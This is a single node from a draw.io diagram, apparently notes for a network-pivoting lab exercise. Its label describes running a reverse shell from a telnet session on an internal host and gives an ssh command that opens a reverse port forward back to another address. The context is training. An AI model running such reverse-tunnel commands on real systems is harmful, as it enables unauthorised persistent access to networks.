        <mxCell id="7UfXdMr0lVw5EJzH1mMs-1" value="run a reverse shell from the telnet session on 172.16.0.60&lt;br&gt;&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span style=&quot;font-size: 10px;&quot;&gt;ssh net3_student11@192.168.0.40 -p 5555 -R 31113:localhost:22&lt;/span&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
